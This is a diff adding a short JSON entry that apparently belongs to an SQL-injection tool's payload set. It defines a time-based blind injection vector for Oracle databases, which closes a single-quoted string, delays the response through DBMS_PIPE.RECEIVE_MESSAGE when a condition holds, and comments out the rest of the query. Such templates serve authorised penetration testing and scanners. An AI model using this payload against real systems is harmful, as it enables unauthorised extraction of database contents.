@@ -1,0 +1,12 @@
+{
+ "dbms": "oracle",
+ "technique": "time",
+ "boundary": {
+  "prefix": "'",
+  "suffix": "-- -",
+  "type": "single-quote",
+  "desc": "single-quoted + inline comment"
+ },
+ "vector": "{B} AND CASE WHEN ({T}) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{SLEEP}) ELSE 0 END=0",
+ "comment": "oracle time via single-quoted + inline comment"
+}
